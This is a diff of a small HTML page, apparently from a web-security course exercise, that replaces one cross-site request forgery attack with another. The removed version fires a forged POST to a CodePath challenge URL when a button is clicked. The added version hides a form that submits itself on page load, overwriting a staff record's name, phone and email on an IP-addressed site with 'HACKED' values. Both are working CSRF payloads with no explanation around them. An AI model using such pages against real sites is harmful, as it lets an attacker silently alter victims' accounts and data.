@@ -1,27 +1,15 @@
 <html>
-<meta charset="UTF-8">
-
-<head>
-    <meta charset="UTF-8">
-    <title>Phong's simple web</title>
-</head>
-
-<body>
-    <div id="intro-button-wrapper">
-        <a href="#"" id=" button_codepath" onclick="codePathXss()">Click here 😈</a>
-        <script>
-            function codePathXss() {
-                var xhr = new XMLHttpRequest();
-                var url =
-                    "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=9464f59d6612758dfdf3985b3f79f9efb804ea10"
-                xhr.open("POST", url, true);
-                xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-                xhr.send();
-                console.log("Hello World")
-            }
-        </script>
-        <h3>Super appreciate it :D Feel free to visit my main site at <a href="https://julianpnguyen.com"">julianpnguyen.com</a></h3>
-    </div>
-</body>
-
+  <head>
+    <title>A RANDOM FORM ON INTERNET</title>
+  </head>
+  <body onload="document.my_form.submit()">
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=9" method="POST" name="my_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="first_name" value="HACKEDDD" />
+      <input type="text" name="last_name" value="HACKED ACCOUNT" />
+      <input type="text" name="phone" value="999-999-9999" />
+      <input type="text" name="email" value="HACKED.hacker@gmail.com" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
 </html>
+
